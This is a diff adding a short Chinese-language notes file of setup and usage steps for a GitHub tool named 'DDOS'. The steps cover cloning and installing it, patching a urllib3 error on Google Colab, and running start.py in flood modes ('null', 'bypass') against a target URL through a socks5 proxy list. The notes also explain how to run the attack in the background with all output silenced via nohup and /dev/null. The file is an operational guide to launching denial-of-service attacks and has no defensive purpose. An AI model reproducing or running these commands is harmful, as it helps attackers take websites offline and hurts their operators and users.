@@ -1,0 +1,37 @@
+git clone https://github.com/TryAgainC/DDOS.git 
+cd DDOS 
+pip3 install -r requirements.txt
+pip install --upgrade 'urllib3==1.26.7' 
+
+
+Google Colab报错cannot import name 'DEFAULT_CIPHERS' from 'urllib3.util.ssl_'
+解决方法：!pip install --upgrade 'urllib3==1.26.7' 
+
+
+python3 start.py
+!python3 start.py null https://example.com 1 30000 socks5.txt 10000 854854
+
+
+
+没有pip3怎么办：
+
+sudo apt update -y
+
+sudo apt install python3-pip -y
+
+没有git怎么办：
+
+sudo apt install git  -y
+
+#后台运行，不输出任何日志
+nohup xxx >/dev/null &
+
+>/dev/null意思是将标准信息输出到一个黑洞（/dev/null），说人话就是不输出标准信息。
+
+>2>&1意思是将错误信息和标准信息使用同一个文件，说人话就是不输出错误信息。
+
+nohup python3 start.py bypass https://example.com 1 30000 socks5.txt 10000 854854 >> /dev/null 2>&1 &
+
+
+
+pip3 install selenium -i https://pypi.tuna.tsinghua.edu.cn/simple  指定清华大学下载源
